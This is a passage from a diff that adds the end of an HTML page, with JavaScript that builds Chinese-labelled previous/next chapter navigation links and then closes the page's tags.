+  var prev = n>1 ? '<a href="'+urlFor(n-1)+'" style="'+linkS+'">← 上一'+label+'（'+prefix+' '+(n-1)+'）</a>' : '<span style="'+disS+'">← 上一'+label+'</span>';
+  var next = n<total ? '<a href="'+urlFor(n+1)+'" style="'+linkS+'">下一'+label+'（'+prefix+' '+(n+1)+'） →</a>' : '<span style="'+disS+'">下一'+label+' →</span>';
+  document.getElementById('page-nav').innerHTML = prev + next;
+})();
+</script>
+
+</body>
+</html>
